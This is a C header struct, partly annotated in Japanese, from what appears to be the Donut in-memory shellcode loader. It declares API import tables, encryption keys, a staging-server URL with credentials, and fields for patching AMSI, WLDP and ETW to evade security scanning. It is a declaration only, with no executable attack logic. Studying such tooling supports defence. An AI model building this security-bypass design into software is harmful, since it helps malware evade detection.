// everything required for an instance goes into the following structure
// 構造体「_DONUT_INSTANCE」型を変数「DONUT_INSTANCE」とポインタ変数「*PDONUT_INSTANCE」の２つで定義
typedef struct _DONUT_INSTANCE {
    uint32_t    len;                          // total size of instance
    // 「DONUT_CRYPT」型は、donut.hで定義
    DONUT_CRYPT key;                          // decrypts instance if encryption enabled

    uint64_t    iv;                           // the 64-bit initial value for maru hash

    union {
      uint64_t  hash[64];                     // holds up to 64 api hashes
      void     *addr[64];                     // holds up to 64 api addresses
      // include prototypes only if header included from loader.h
      #ifdef LOADER_H
      // union内にある無名構造体は、この場合「api.LoadLibrary」と指定できる
      struct {
        // imports from kernel32.dll or kernelbase.dll
        LoadLibraryA_t                   LoadLibraryA;
        GetProcAddress_t                 GetProcAddress;        
        GetModuleHandleA_t               GetModuleHandleA;  
        VirtualAlloc_t                   VirtualAlloc;     
        VirtualFree_t                    VirtualFree;  
        VirtualQuery_t                   VirtualQuery;
        VirtualProtect_t                 VirtualProtect;
        Sleep_t                          Sleep;
        MultiByteToWideChar_t            MultiByteToWideChar;
        GetUserDefaultLCID_t             GetUserDefaultLCID;
        WaitForSingleObject_t            WaitForSingleObject;
        CreateThread_t                   CreateThread;
        CreateFileA_t                    CreateFileA;
        GetFileSizeEx_t                  GetFileSizeEx;
        GetThreadContext_t               GetThreadContext;
        GetCurrentThread_t               GetCurrentThread;
        GetCurrentProcess_t              GetCurrentProcess;
        GetCommandLineA_t                GetCommandLineA;
        GetCommandLineW_t                GetCommandLineW;
        HeapAlloc_t                      HeapAlloc;
        HeapReAlloc_t                    HeapReAlloc;
        GetProcessHeap_t                 GetProcessHeap;
        HeapFree_t                       HeapFree;
        GetLastError_t                   GetLastError;
        CloseHandle_t                    CloseHandle;
        
        // imports from shell32.dll
        CommandLineToArgvW_t             CommandLineToArgvW;
        
        // imports from oleaut32.dll
        SafeArrayCreate_t                SafeArrayCreate;          
        SafeArrayCreateVector_t          SafeArrayCreateVector;    
        SafeArrayPutElement_t            SafeArrayPutElement;      
        SafeArrayDestroy_t               SafeArrayDestroy;
        SafeArrayGetLBound_t             SafeArrayGetLBound;        
        SafeArrayGetUBound_t             SafeArrayGetUBound;        
        SysAllocString_t                 SysAllocString;           
        SysFreeString_t                  SysFreeString;
        LoadTypeLib_t                    LoadTypeLib;
        
        // imports from wininet.dll
        InternetCrackUrl_t               InternetCrackUrl;         
        InternetOpen_t                   InternetOpen;             
        InternetConnect_t                InternetConnect;          
        InternetSetOption_t              InternetSetOption;        
        InternetReadFile_t               InternetReadFile;         
        InternetCloseHandle_t            InternetCloseHandle;      
        InternetQueryDataAvailable_t     InternetQueryDataAvailable;      
        HttpOpenRequest_t                HttpOpenRequest;          
        HttpSendRequest_t                HttpSendRequest;          
        HttpQueryInfo_t                  HttpQueryInfo;
        
        // imports from mscoree.dll
        CorBindToRuntime_t               CorBindToRuntime;
        CLRCreateInstance_t              CLRCreateInstance;
        
        // imports from ole32.dll
        CoInitializeEx_t                 CoInitializeEx;
        CoCreateInstance_t               CoCreateInstance;
        CoUninitialize_t                 CoUninitialize;
        
        // imports from ntdll.dll
        RtlEqualUnicodeString_t          RtlEqualUnicodeString;
        RtlEqualString_t                 RtlEqualString;
        RtlUnicodeStringToAnsiString_t   RtlUnicodeStringToAnsiString;
        RtlInitUnicodeString_t           RtlInitUnicodeString;
        RtlExitUserThread_t              RtlExitUserThread;
        RtlExitUserProcess_t             RtlExitUserProcess;
        RtlCreateUnicodeString_t         RtlCreateUnicodeString;
        RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
        RtlDecompressBuffer_t            RtlDecompressBuffer;
        NtContinue_t                     NtContinue;
        NtCreateSection_t                NtCreateSection;
        NtMapViewOfSection_t             NtMapViewOfSection;
        NtUnmapViewOfSection_t           NtUnmapViewOfSection;
       // AddVectoredExceptionHandler_t    AddVectoredExceptionHandler;
       // RemoveVectoredExceptionHandler_t RemoveVectoredExceptionHandler;
       // RtlFreeUnicodeString_t         RtlFreeUnicodeString;
       // RtlFreeString_t                RtlFreeString;
      };
      #endif
    } api;
    
    int         exit_opt;                     // 1 to call RtlExitUserProcess and terminate the host process, 2 to never exit or cleanup and block
    int         entropy;                      // indicates entropy level
    uint32_t    oep;                          // original entrypoint
    
    // everything from here is encrypted
    int         api_cnt;                      // the 64-bit hashes of API required for instance to work
    char        dll_names[DONUT_MAX_NAME];    // a list of DLL strings to load, separated by semi-colon
    
    char        dataname[8];                  // ".data"
    char        kernelbase[12];               // "kernelbase"
    char        amsi[8];                      // "amsi"
    char        clr[4];                       // "clr"
    char        wldp[8];                      // "wldp"
    char        ntdll[8];                     // "ntdll"
    
    char        cmd_syms[DONUT_MAX_NAME];     // symbols related to command line
    char        exit_api[DONUT_MAX_NAME];     // exit-related API
    
    int         bypass;                       // indicates behaviour of byassing AMSI/WLDP/ETW
    int         headers;                      // indicates whether to overwrite PE headers
    char        wldpQuery[32];                // WldpQueryDynamicCodeTrust
    char        wldpIsApproved[32];           // WldpIsClassInApprovedList
    char        amsiInit[16];                 // AmsiInitialize
    char        amsiScanBuf[16];              // AmsiScanBuffer
    char        amsiScanStr[16];              // AmsiScanString
    char        etwEventWrite[16];            // EtwEventWrite
    char        etwEventUnregister[20];       // EtwEventUnregister
    char        etwRet64[1];                  // "ret" instruction for Etw
    char        etwRet32[4];                  // "ret 14h" instruction for Etw
    
    char        wscript[8];                   // WScript
    char        wscript_exe[12];              // wscript.exe

    char        decoy[MAX_PATH * 2];            // path of decoy module

    GUID        xIID_IUnknown;
    GUID        xIID_IDispatch;
    
    // GUID required to load .NET assemblies
    GUID        xCLSID_CLRMetaHost;
    GUID        xIID_ICLRMetaHost;  
    GUID        xIID_ICLRRuntimeInfo;
    GUID        xCLSID_CorRuntimeHost;
    GUID        xIID_ICorRuntimeHost;
    GUID        xIID_AppDomain;
    
    // GUID required to run VBS and JS files
    GUID        xCLSID_ScriptLanguage;         // vbs or js
    GUID        xIID_IHost;                    // wscript object
    GUID        xIID_IActiveScript;            // engine
    GUID        xIID_IActiveScriptSite;        // implementation
    GUID        xIID_IActiveScriptSiteWindow;  // basic GUI stuff
    GUID        xIID_IActiveScriptParse32;     // parser
    GUID        xIID_IActiveScriptParse64;
    
    int         type;                       // DONUT_INSTANCE_EMBED, DONUT_INSTANCE_HTTP 
    char        server[DONUT_MAX_NAME];     // staging server hosting donut module
    char        username[DONUT_MAX_NAME];   // username for web server
    char        password[DONUT_MAX_NAME];   // password for web server
    char        http_req[8];                // just a buffer for "GET"

    uint8_t     sig[DONUT_MAX_NAME];        // string to hash
    uint64_t    mac;                        // to verify decryption ok
    
    DONUT_CRYPT mod_key;       // used to decrypt module
    uint64_t    mod_len;       // total size of module
    
    union {
      PDONUT_MODULE p;         // Memory allocated for module downloaded via DNS or HTTP
      DONUT_MODULE  x;         // Module is embedded
    } module;
} DONUT_INSTANCE, *PDONUT_INSTANCE;
